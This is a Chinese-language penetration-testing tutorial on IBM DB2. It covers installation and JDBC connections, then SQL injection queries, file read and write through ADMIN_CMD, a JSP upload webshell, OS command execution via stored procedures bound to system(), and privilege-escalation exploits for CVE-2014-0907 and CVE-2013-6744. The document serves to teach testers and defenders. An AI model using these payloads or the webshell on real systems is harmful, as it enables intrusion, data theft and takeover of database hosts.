# DB2在渗透中的应用

0x00 DB2简介
==========

* * *

DB2是IBM公司推出关系型数据库管理系统。

现今DB2主要包含以下三个系列：

*   DB2 for Linux, UNIX and Windows(LUW)
*   DB2 for z/OS
*   DB2 for i(formerly OS/400)

IBM DB2定位于高端市场，广泛应用于企业级应用中

0x01 DB2的安装
===========

* * *

以下两小节分别介绍DB2在Linux和Windows平台下的安装，安装的版本都为V9.5版本

DB2在Linux下的安装
-------------

在Linux下DB2依赖compat-libstdc++库，安装DB2之前需要先行安装该库

安装上述库完成后运行DB2安装程序中的db2setup启动图形化安装界面

![pic1](http://drops.javaweb.org/uploads/images/bf0cd5a46cfd21cbc9e9a93208f72db54426d8f8.jpg)

DB2在安装过程中会创建db2inst1、db2fenc1以及dasusr1三个用户，此三个用户会加入到系统中成为系统的用户，也可以在安装之前就创建

![pic2](http://drops.javaweb.org/uploads/images/fa929a22126e7b5f362f9c816a5bb968f36f55d6.jpg)

![pic3](http://drops.javaweb.org/uploads/images/650de482854fbf8b566a09bb06a903bbc53fbdfe.jpg)

![pic4](http://drops.javaweb.org/uploads/images/3eaf9b0bc19c056d52d9ecf2202d9e2141459392.jpg)

安装完成后切换到db2inst1用户，运行db2cc启动图形化控制中心（DB2从V10.1版本开始不再包含图形化的控制中心，可使用命令行或IBM提供的Data Studio工具管理）

![pic5](http://drops.javaweb.org/uploads/images/38e9e7de7eedc86177501ede679cd2b7d64073dc.jpg)

DB2在Windows下的安装
---------------

运行安装程序中的setup.exe程序开始安装，安装过程中会创建db2admin用户，并将该用户添加到管理员组中

安装完成后启动控制中心

![pic6](http://drops.javaweb.org/uploads/images/8e29012b6c19adff8007551f814274b2b47d4e3b.jpg)

0x02 DB2的使用
===========

* * *

DB2服务及端口
--------

DB2各项服务名称及端口可使用以下方法查看：

Linux：

```
/etc/services 文件

```

Windows：

```
C:\Windows\System32\drivers\etc\services文件

```

DB2默认监听连接的端口为50000

DB2的用户
------

DB2的所有用户都是操作系统用户，且用户密码也与操作系统中该用户的密码绑定。

Linux下，安装DB2会创建db2inst1，db2fenc1和dasusr1三个用户。Windows下，会创建db2admin用户并将其添加到管理员组。

本地操作系统用户并不全为DB2用户，需要在DB2管理功能中添加操作系统用户为数据库用户。

本地管理DB2
-------

### 命令行方式

本地管理DB2数据库可以使用命令行或图形化工具

IBM DB2 Universal Database（UDB）命令行处理器（CLP）是用于访问 DB2 函数的方便接口，CLP 接受来自 DB2 命令行的命令或 SQL 语句。

在基于Linux 和 UNIX 的系统中，这个命令行是 DB2 实例的命令行。

在Windows 操作系统中，它是启用了CLP 命令窗口的命令行；在这种情况下，必须先（从普通命令窗口）运行 db2cmd 命令来启动 DB2 命令行环境。

Windows下的命令行：

![pic7](http://drops.javaweb.org/uploads/images/80b208b3dda6e5aa4b1c9715ba7e6741f6e57937.jpg)

Linux下的命令行：

![pic8](http://drops.javaweb.org/uploads/images/7042dceb0ba521063d8a52d5784c25b53f134bd1.jpg)

命令行的详细使用方法及语法可参考IBM官方文档

### 图形界面方式

可使用DB2的控制中心在本地使用图形化方式管理DB2，如下：

Windows：

![pic9](http://drops.javaweb.org/uploads/images/caebb04577cd56d3a1b2e61de8315bb085e26623.jpg)

Linux：

![pic10](http://drops.javaweb.org/uploads/images/e5b93928c4a1931b984972c0a92de27afeff5f31.jpg)

注：  
DB2从V10.1版本开始不再包含图形化的控制中心，可IBM提供的DataStudio工具替换

远程管理DB2
-------

远程管理DB2也有命令行和图形化两种方式，使用命令行方式需要安装DB2客户端，可在IBM官网上下载。

远程图形化管理可以使用Quest Centor for DB2工具。使用该工具也需要安装DB2客户端。

该工具使用方法如下：

右键添加DB2服务器：

![pic11](http://drops.javaweb.org/uploads/images/00d3286cb5114c47e1682c1486fc070a605aa6d4.jpg)

配置DB2服务器的地址和操作系统：

![pic12](http://drops.javaweb.org/uploads/images/8675036fb9709df9733d8c41e4e7962a7d4a1741.jpg)

配置节点名称，实例名称和数据库端口：

![pic13](http://drops.javaweb.org/uploads/images/1092e033a3f98158b4335a7ca2acb1cb8df36959.jpg)

在实例上右键管理登录配置登录凭证：

![pic14](http://drops.javaweb.org/uploads/images/dfae6eacca521ba46f8f86474e44325b7d3815cb.jpg)

![pic15](http://drops.javaweb.org/uploads/images/6d1b30d8eebae293a83141d6662f02ddd0ae08df.jpg)

在实例上右键添加数据库：

![pic16](http://drops.javaweb.org/uploads/images/7aeebc24abf37a7747aa8ae41dbf6f1204cd0100.jpg)

![pic17](http://drops.javaweb.org/uploads/images/e49b22dd973997fd3cf0e462179b8982fbfc8ecf.jpg)

添加后情况：

![pic18](http://drops.javaweb.org/uploads/images/0674dfc98c726b582d17a0bf282a40bd6a3f3db6.jpg)

执行SQL语句：

![pic19](http://drops.javaweb.org/uploads/images/236bf73f3cdd5afb4505885a806f9a8de87cb03a.jpg)

在JAVA程序中连接DB2
-------------

JAVA程序连接DB2有四种方式TYPE1、TYPE2、TYPE3、TYPE4，其中TYPE2和TYPE4应用较广泛，四种方式的基本架构如下：

TYPE1：

![pic20](http://drops.javaweb.org/uploads/images/5890d8d1cc0bd44e4f1b1a4d493011e06fbf9879.jpg)

TYPE2：

![pic21](http://drops.javaweb.org/uploads/images/4b1b51dac4a6ea10270b525e006dd59a11a6bc49.jpg)

TYPE3：

![pic22](http://drops.javaweb.org/uploads/images/7ccefda5432bb2513d21331d937e665e8418a9f1.jpg)

TYPE4：

![pic23](http://drops.javaweb.org/uploads/images/316f34540f38fab04b368aed650ff087a005d980.jpg)

下面介绍使用TYPE2和TYPE4方式连接DB2的方法

使用TYPE2方式必须安装DB2客户端,在客户端中添加相关数据库并设置别名，可使用客户端命令行或图形化工具“配置助手”添加，如下图

![pic24](http://drops.javaweb.org/uploads/images/ccbf8aba92dee32ce15485e0348baaeea0c1b3e2.jpg)

使用TYPE2类型有两种方法：

**方法一：**

驱动程序位于db2jcc.jar包中，且在Windows下JDK必须可以访问到db2jdbc.dll和db2jcct2.dll，db2jdbc.dll和db2jcct2.dll位于DB2客户端程序SQLLIB/BIN目录下

连接代码如下：

```
Class.forName("com.ibm.db2.jcc.DB2Driver").newInstance();       
conn = DriverManager.getConnection("jdbc:db2:TESTDB2", "db2admin", "123456");

```

其中`jdbc:db2:TESTDB2`中的`TESTDB2`即为之前在客户端中添加的数据库别名

**方法二：**

驱动程序位于db2java.zip包中，且在Windows下JDK必须可以访问到db2jdbc.dll，db2jdbc.dll位于DB2客户端程序SQLLIB/BIN目录下

连接代码如下：

```
Driver driver=(Driver) Class.forName("COM.ibm.db2.jdbc.app.DB2Driver").newInstance(); 
DriverManager.registerDriver(driver);
conn = DriverManager.getConnection("jdbc:db2:TESTDB2", "db2admin", "123456");

```

其中`jdbc:db2:TESTDB2`中的`TESTDB2`即为之前在客户端中添加的数据库别名

注：db2java.zip在DB2 LUW 10.1中已停用，如要使用TYPE2方式建议使用db2jcc.jar驱动程序

使用TYPE4方式连接DB2方法：

驱动程序位于db2jcc.jar包中，使用此方法应用程序所在主机不需安装任何其他程序

连接代码：

```
Class.forName(com.ibm.db2.jcc.DB2Driver).newInstance();
conn =DriverManager.getConnection(jdbc:db2://192.168.60.144:50000/TESTDB2, db2admin, 123456);

```

注：

1.  TYPE4需设置数据库的编码为utf-8否则报错
2.  TYPE4还需要db2jcc_license_cu.jar

上述驱动程序所在包db2jcc.jar、db2jcc_license_cu.jar、db2java.zip均可在DB2服务器安装目录下找到，例如在Windows版本V9.5中位于DB2安装目录下的SQLLIB/java目录

![pic25](http://drops.javaweb.org/uploads/images/cd85fd61f8b8bf3df724384fe5932e1138b8541e.jpg)

db2jcc.jar与db2java.zip驱动程序在错误处理方面有所不同

查询在DB2服务器端出现错误时，db2java.zip驱动程序会将DB2服务器产生的错误信息原样返回给应用程序，而db2jcc.jar驱动程序使用了自定义的错误信息。

db2java.zip的错误信息：

![pic26](http://drops.javaweb.org/uploads/images/5a2caeacd7550a25e71af5b3193a7af15e37bec1.jpg)

db2jcc.jar的错误信息：

![pic27](http://drops.javaweb.org/uploads/images/0ceb09298b86dcf1ec4cd3b3702dcab90f1392fa.jpg)

0x03 DB2 SQL注入相关问题
==================

* * *

获取DB2数据库信息的语句
-------------

获取数据库版本：

```
SELECT service_level FROM table(sysproc.env_get_inst_info()) as instanceinfo

```

获取当前用户：

```
SELECT user FROM sysibm.sysdummy1
SELECT session_user FROM sysibm.sysdummy1
SELECT system_user FROM sysibm.sysdummy1

```

获取数据库的用户：

```
SELECT distinct(authid) FROM sysibmadm.privileges
SELECT distinct(grantee) FROM sysibm.systabauth

```

获取数据库表的权限：

```
SELECT * FROM syscat.tabauth

```

获取当前用户的权限：

```
SELECT * FROM syscat.tabauth where grantee = current user

```

列出数据库的DBA账户：

```
SELECT distinct(grantee) FROM sysibm.systabauth where CONTROLAUTH='Y'

```

获取当前数据库：

```
SELECT current server FROM sysibm.sysdummy1

```

获取当前数据库中所有表：

```
SELECT table_name FROM sysibm.tables
SELECT name FROM sysibm.systables

```

获取当前数据库中所有列：

```
SELECT name, tbname, coltype FROM sysibm.syscolumns

```

获取数据库所在主机相关信息：

```
SELECT * FROM sysibmadm.env_sys_info

```

DB2 SQL语句特性
-----------

注释符：

DB2数据库使用双连字符`--`作为单行注释，使用`/**/`作为多行注释

SELECT中获得前N条记录的SQL语法：

```
SELECT * FROM sysibm.systables ORDER BY name ASC fetch first N rows only

```

截取字符串：

```
SELECT substr('abc',2,1) FROM sysibm.sysdummy1

```

上述语句会得到字符b

比特操作AND/OR/NOT/XOR

```
SELECT bitand(1,0) FROM sysibm.sysdummy1

```

上述语句会得到0

字符与ASCII码互相转换：

```
SELECT chr(65) FROM sysibm.sysdummy1

```

上述语句会得到字符’A’

```
SELECT ascii('A') FROM sysibm.sysdummy1

```

上述语句会得到字符’A’的ASCII码65

类型转换：

```
SELECT cast('123' as integer) FROM sysibm.sysdummy1

```

上述语句将字符串”123”转为数据123

```
SELECT cast(1 as char) FROM sysibm.sysdummy1

```

上述语句将数字1转为字符串”1”

字符串连接：

```
SELECT 'a' concat 'b' concat 'c' FROM sysibm.sysdummy1
SELECT 'a' || 'b' || 'c' FROM sysibm.sysdummy1

```

上述两个语句都会返回字符串”abc”

获取长度：

```
SELECT LENGTH(NAME) FROM SYSIBM.SYSCOLUMNS WHERE TBNAME='VOTE' ORDER BY NAME DESC FETCH FIRST 1 ROWS ONLY

```

条件语句：

```
SELECT CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END FROM sysibm.sysdummy1

```

上述语句将返回字符串'AAAAAAAAAA'

时间延迟：

```
and (SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1)=68

```

上述语句若user的第一个字符的ASCII码为68将造成延时

UNION操作符：

DB2支持在SELECT语句中使用UNION操作符，UNION的各列必须类型相同才不会报错。

且不能直接使用`SELECT … FROM … UNION SELECT NULL, NULL … FROM …`的方法。DB2在SELECT中使用NULL需要指定类型，如下：

```
select ... cast(NULL as int) as column_A, cast(NULL as varchar(128)) as column_B, ... FROM ...

```

多语句查询：

DB2不支持形如statement1; statement2形式的多语句查询

DB2的SQL注入方法
-----------

对DB2进行SQL注入通用的方法是使用盲注，利用上两个小结的内容通过盲注获取数据库信息。

由于DB2的UNION操作符限制较多，因此利用UNION注入很多时候不会成功。由于DB2不支持多语句查询，因此无法通过多语句查询方法注入并调用存储过程。

另外，可利用数据库的报错信息通过SQL注入获取部分敏感信息，如下：

先使用通用的orderby方法猜出列数

在查询的条件后附加`group by 1--`会显示本次查询的表中的第一列列名ID，之后将条件改为`group by ID--`得到第二列的列名NAME，依次增加group by后的列名，如group by ID, NAME，将枚举当前表中的所有列

![pic28](http://drops.javaweb.org/uploads/images/6ec379cdb70d2298c528e493b10ee37f032678bf.jpg)

![pic29](http://drops.javaweb.org/uploads/images/b7715a6bfff4965f54b0bf88c8e8b0155724c83e.jpg)

DB2的SQL注入工具
-----------

经测试针对DB2的SQL注入工具中sqlmap相对具有可用性，部分截图如下：

![pic30](http://drops.javaweb.org/uploads/images/154f63d3b0d0a1504d837b4c0094f54d6a9f60e6.jpg)

![pic31](http://drops.javaweb.org/uploads/images/b1e3e47f5560c3954afb15c137a9ed603fffb549.jpg)

![pic32](http://drops.javaweb.org/uploads/images/2587cef622e31e62f3582257aa1ff724de932569.jpg)

但经测试其仍然存在一些问题，如获取列信息不全、盲注功能不好用等

0x04 利用DB2读写操作系统文件
==================

* * *

在渗透测试中可以使用DB2读写系统文件，达到获取敏感信息、写webshell等目的。

本节所描述方法在DB2 V9.5 Windows, Linux下测试成功

利用DB2读操作系统文件
------------

DB2使用IMPORT命令从文件中读取内容并插入到数据库表中，使用方法：

```
IMPORT FROM C:\Windows\win.ini OF DEL INSERT INTO CONTENT

```

上述命令运行后即可将C:\Windows\win.ini的内容插入到表CONTENT中

DB2的ADMIN_CMD存储过程用于执行DB2命令行（CLP）命令，其schema为SYSPROC，从8.2.2版本开始引入 该存储过程语法：

```
ADMIN_CMD('command_string')

```

参数command_string为要运行的命令

调用存储过程使用CALL语句，语法：

```
CALL ADMIN_CMD('command_string')

```

调用ADMIN_CMD存储过程执行IMPORT命令将文件读入数据库表方法：

```
CALL ADMIN_CMD('IMPORT FROM C:\Windows\win.ini OF DEL INSERT INTO CONTENT');

```

运行该存储过程的结果：

![pic33](http://drops.javaweb.org/uploads/images/ad00a8e5ca1e8f65c8fb1c07377e359b0cc6ba72.jpg)

![pic34](http://drops.javaweb.org/uploads/images/0bcc34430de37abe0e45d6e349d95f09310a35cf.jpg)

![pic35](http://drops.javaweb.org/uploads/images/aec6808238bd5e7cc729c22a525ff5146d41db72.jpg)

远程连接数据库的用户可以通过调用ADMIN_CMD存储过程读取操作系统文件，经测试（DB2 V9.5）数据库普通用户默认具有调用ADMIN_CMD存储过程的权限，远程连接数据库的用户可以首先创建一个表（或对已存在的IMPORT命令涉及的表有INSERT和SELECT权限），然后调用ADMIN_CMD存储过程运行IMPORT命令将文件读入创建的表中。如下：

远程连接数据库并调用ADMIN_CMD存储过程运行IMPORT命令：

![pic36](http://drops.javaweb.org/uploads/images/8de40b1d2136aa2cdb54c0274808d7a64997cad7.jpg)

![pic37](http://drops.javaweb.org/uploads/images/ddb1b645d4a46d7530a52d25d40d982eabd4c38c.jpg)

读取的文件信息：

![pic38](http://drops.javaweb.org/uploads/images/e2458fc6968bfabdfcaee9b158c996b58e358208.jpg)

利用DB2向操作系统写文件
-------------

DB2的EXPORT命令用于将数据库中的内容导入到文件中，使用语法如下：

```
EXPORT TO result.csv OF DEL MODIFIED BY NOCHARDEL SELECT col1, col2, coln FROM testtable;

```

使用上一小节提到的ADMIN_CMD存储过程运行该命令方法：

```
CALL SYSPROC.ADMIN_CMD ('EXPORT TO C:\RESULT.TXT OF DEL MODIFIED BY NOCHARDEL SELECT * FROM VOTENAME');

```

调用过程和结果：

![pic39](http://drops.javaweb.org/uploads/images/3578b4ec73b2b59a83350eb5d847d412359030d5.jpg)

![pic40](http://drops.javaweb.org/uploads/images/edafbb48fe1d6656a5e8338ece5e76880059e700.jpg)

远程连接数据库的用户可以先创建一个表（或对EXPORT命令涉及的表具有SELECT权限），然后调用ADMIN_CMD存储过程执行EXPORT命令向操作系统写文件

向操作系统写入包含某些字符串的文件语法如下：

```
CALL SYSPROC.ADMIN_CMD ('EXPORT TO C:\RESULT.TXT OF DEL MODIFIED BY NOCHARDEL SELECT ''My Content'' FROM VOTENAME FETCH FIRST 1 ROWS ONLY');

```

远程调用结果：

![pic41](http://drops.javaweb.org/uploads/images/6b84bf48b6905b2219f41f6c1cf57bdb799faf38.jpg)

![pic42](http://drops.javaweb.org/uploads/images/5010659c3ebf03a22bf9023947c1c3718185e5e0.jpg)

利用该方法写webshell语法：

```
CALL SYSPROC.ADMIN_CMD ('EXPORT TO C:\RESULT.jsp OF DEL MODIFIED BY NOCHARDEL SELECT ''<%if(request.getParameter("f")!=null){(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("c").getBytes());response.getWriter().print("[OK]");}%>'' FROM VOTENAME FETCH FIRST 1 ROWS ONLY');

```

远程调用结果：

![pic43](http://drops.javaweb.org/uploads/images/78590a3177d33c124b603bde27595e0f511100c5.jpg)

![pic44](http://drops.javaweb.org/uploads/images/107c9d928deaeb23ce28056793f7b7d4cdd31689.jpg)

![pic45](http://drops.javaweb.org/uploads/images/f7ce00e187abfda0c831f7674ee304ea6b459325.jpg)

注：  
通过EXPORT向文件写入自定义字符串内容时SELECT的表中必须至少有一条记录否则写入内容为空

0x05 利用DB2执行操作系统命令
==================

* * *

可利用DB2存储过程执行操作系统命令。远程连接数据库的用户需要具有创建存储过程的权限，连接数据库后创建一个可以执行操作系统命令的存储过程并调用。

创建此种存储过程并调用的语法如下：

Windows：

```
CREATE PROCEDURE db2_cmd_exec (IN cmd varchar(200))
EXTERNAL NAME 'c:\windows\system32\msvcrt!system' 
LANGUAGE C 
DETERMINISTIC 
PARAMETER STYLE DB2SQL

CALL db2_cmd_exec ('whoami /all > C:\whoami.log')

```

Linux：

```
CREATE PROCEDURE db2_cmd_exec (IN cmd varchar(200))
EXTERNAL NAME '/usr/lib/libstdc++.so.6!system' 
LANGUAGE C 
DETERMINISTIC 
PARAMETER STYLE DB2SQL

call db2_cmd_exec ('whoami > /tmp/whoami.log')

```

运行结果：

![pic46](http://drops.javaweb.org/uploads/images/afbd4754cf2fbe3fdab12b28835a8ebac44efc90.jpg)

![pic47](http://drops.javaweb.org/uploads/images/4189e81c077b3cce381ffd87a1dc35888bbe2b90.jpg)

![pic48](http://drops.javaweb.org/uploads/images/5aff72f44cbfb89c07b47652b9fd004693560655.jpg)

![pic49](http://drops.javaweb.org/uploads/images/380a09c48bc632a2078bc3a48898788589da1d0d.jpg)

注：

创建的存储过程默认为FENCED（受保护的），例如对于Linux下DB2的，使用db2inst1用户连接数据库创建并运行上述存储，DB2服务器端实际是以db2fenc1用户运行该存储过程的。

FENCED存储过程单独启用一个新的地址空间，而UNFENCED存储过程和调用它的进程使用用一个地址空间，一般来说FENCED存储过程比较安全。

若要创建NOTFENCED的存储过程（需要具有SYSADM特权、DBADM 特权或一个特殊的特权（CREATE_NOT_FENCED）），需要在创建存储过程中指定，如下

```
CREATE PROCEDURE db2_cmd_exec (IN cmd varchar(200))
EXTERNAL NAME '/usr/lib/libstdc++.so.6!system' 
LANGUAGE C 
DETERMINISTIC 
PARAMETER STYLE DB2SQL
NOT FENCED

```

0x06 利用DB2提权
============

* * *

本节介绍两个DB2提权漏洞原理及利用方法

CVE-2014-0907
-------------

CVE-2014-0907是一个DB2本地提权漏洞，受影响版本为AIX, Linux, HP-UX以及Solaris上的DB2 V9.5（FP9之前的V9.5不受影响）, V9.7, V10.1, V10.5版本

CVE-2014-0907漏洞允许一个本地普通用户获取到root权限

DB2的db2iclean程序会在当前目录下搜索libdb2ure2.so.1库文件，下图为执行该程序时对库文件的访问情况，可见DB2对于libdb2ure2.so.1库文件的搜索在当前目录先于DB2安装目录

```
strace -o /tmp/db2iclean.log  /home/db2inst1/sqllib/adm/db2iclean

```

![pic50](http://drops.javaweb.org/uploads/images/117039e272811be1a9afa513023adb6673bf8813.jpg)

如果当前目录下有恶意用户写入的同名库文件，则DB2程序会加载该文件并执行其中的代码。由于db2iclean命令是SUID root权限，因此恶意代码会以root权限被运行。

![pic51](http://drops.javaweb.org/uploads/images/baa7412028aeca786b9e3b8cfd6edc0a0a3b6978.jpg)

如将下列代码编译为库文件并放在当前目录下：

```
// libdb2ure2.cpp
#include <stdlib.h>
int iGetHostName(char* n, int i)
{
    system("id > /m.log");
}

$ gcc -shared -o libdb2ure2.so.1 libdb2ure2.cpp

```

使用db2iadm1组的普通用户运行db2iclean程序：

```
<DB2_instance_install_directory>/adm/db2iclean

```

可见此时euid为0，代码以root权限运行

![pic52](http://drops.javaweb.org/uploads/images/336ca8b9f1a91af95d12c429564421c19c41a983.jpg)

注意：由于db2iclean不是公开执行权限，所以攻击者需要使用db2iadm1组用户执行，或诱使该组成员在攻击者写入了恶意库文件的目录下执行该程序。

CVE-2013-6744
-------------

CVE-2013-6744是DB2在windows平台下的提权漏洞，利用该漏洞将使windows普通用户获取到Administrator权限

存在漏洞的DB2版本：

*   9.5, 9.7 FP9a之前版本
*   10.1 FP3a之前版本
*   10.5 FP3a之前版本

利用该漏洞需要有一个可以连接DB2数据库的用户，且该用户具有创建外部例程的权限(CREATE_EXTERNAL_ROUTINE)

该漏洞原理为：在Windows平台特权帐户默认情况下，DB2服务运行时并不受访问控制检查，这意味着可以通过CREATE_EXTERNAL_ROUTINE权限创建一个库文件并且形成调用，从而权限得以提升。

漏洞利用步骤：

1.使用具有CREATE_EXTERNAL_ROUTINE权限的用户运行以下DDL，利用C runtime system来创建一个存储过程：

```
CREATE PROCEDURE db2_exec (IN cmd varchar(1024)) EXTERNAL NAME 'msvcrt!system' LANGUAGE C DETERMINISTIC PARAMETER STYLE DB2SQL

```

2.调用刚才创建的存储过程：

```
CALL db2_exec('whoami /all > C:\whoami.log')

```

查看命令创建的whoami.log文件，发现包含了db2admin信息。这意味着，我们用一个非管理员账户成功用管理员权限执行了命令。

0x07 参考
=======

* * *

*   [http://en.wikipedia.org/wiki/IBM_DB2](http://en.wikipedia.org/wiki/IBM_DB2)
*   [http://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0503melnyk/](http://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0503melnyk/)
*   [http://www.sqlinjectionwiki.com/Categories/7/ibmdb2-sql-injection-cheat-sheet/](http://www.sqlinjectionwiki.com/Categories/7/ibmdb2-sql-injection-cheat-sheet/)
*   [http://www-01.ibm.com/support/docview.wss?uid=swg21672100](http://www-01.ibm.com/support/docview.wss?uid=swg21672100)
*   [http://blog.spiderlabs.com/2014/07/about-two-ibm-db2-luw-vulnerabilities-patched-recently.html](http://blog.spiderlabs.com/2014/07/about-two-ibm-db2-luw-vulnerabilities-patched-recently.html)